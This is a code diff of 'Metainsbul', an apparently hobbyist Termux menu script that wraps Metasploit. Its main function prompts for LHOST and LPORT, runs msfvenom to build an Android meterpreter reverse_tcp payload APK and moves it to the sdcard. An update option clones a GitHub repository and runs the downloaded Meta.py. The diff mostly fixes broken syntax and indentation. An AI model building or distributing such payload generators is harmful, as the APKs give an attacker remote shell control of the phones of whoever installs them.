@@ -1,33 +1,30 @@
 import os
 
 def build_payload():
+    lhost = input("LHOST - ")
+    lport = input("LPORT - ")
+    apk_name = input("Payload Name - ")
+    print("THE PAYLOAD IS AUTOMATICALLY MOVED TO YOUR Sdcard")
+    print("JUST OPEN FILE MANAGER AND VISIT APKS OR JUST SCROLL DOWN")
+    print("IN FOLDERS SECTION")
 
-lhost = input("LHOST - ")
-lport = input("LPORT - ")
-apk_name = input("Paload Name - ")
-print(" THE PAYLOAD IS AUTOMATICALLY MOVED TO YOUR Sdcard")
-print(" JUST OPEN FILE MANAGER AND VISIT APKS OR JUST SCROLL DOWN")
-print("IN FOLDERS SECTION")
+    msfvenom_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {apk_name}.apk"
 
-msfvenom_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {apk_name}"
+    print(msfvenom_command)
 
-print(msfvenom_command)
+    os.system(msfvenom_command)
 
-os.system(msfvenom_command)
-
-os.system(f"mv {apk_name} /storage/emulated/0/")
+    os.system(f"mv {apk_name}.apk /sdcard/")
 
 def update():
-    os.system(git clone https://github.com/KiNGEX1/Metainsbul.git)
-    os.system(cd Metainsbul)
-    os.system(chmod +x Meta.py)
-    os.system(python Meta.py)
-
+    os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
+    os.chdir("Metainsbul")
+    os.system("chmod +x Meta.py")
+    os.system("python Meta.py")
 
 def install_metasploit():
     os.system('''
-    #!/data/data/com.termux/files/usr/bin/bash
-chmod +x Meta.sh
+   #!/data/data/com.termux/files/usr/bin/bash
 clear
 echo "
    
@@ -206,23 +203,25 @@ def launch_metasploit():
     os.system("msfconsole")
 
 while True:
+    
     print("███╗░░░███╗███████╗████████╗░█████╗░██╗███╗░░██╗░██████╗██████╗░██╗░░░██╗██╗░░░░░")
     print("████╗░████║██╔════╝╚══██╔══╝██╔══██╗██║████╗░██║██╔════╝██╔══██╗██║░░░██║██║░░░░░")
     print("██╔████╔██║█████╗░░░░░██║░░░███████║██║██╔██╗██║╚█████╗░██████╦╝██║░░░██║██║░░░░░")
     print("██║╚██╔╝██║██╔══╝░░░░░██║░░░██╔══██║██║██║╚████║░╚═══██╗██╔══██╗██║░░░██║██║░░░░░")
     print("██║░╚═╝░██║███████╗░░░██║░░░██║░░██║██║██║░╚███║██████╔╝██████╦╝╚██████╔╝███████╗")
     print("╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝")
-    print(" By KiNGEX | github.com/KiNGEX1")
-    print("_________________________________")
-    print("Options:")
+    print(" By KiNGEX | https://GitHub.com/KiNGEX1")
+    print("__________________________________________")
+    
+    print("options:")
     print("1. Build Payload")
     print("2. Install Metasploit")
     print("3. Launch Metasploit")
-    print("4. Update Metainsbul") print("Recommend")
+    print("4. Update Metainsbul (Recommend)") 
     print("5. Exit")
-    
+
     choice = input("Enter your choice: ").strip()
-    
+
     if choice == '1':
         build_payload()
     elif choice == '2':
@@ -235,5 +234,4 @@ while True:
         break
     else:
         print("Invalid choice. Please select a valid option.")
-        
         
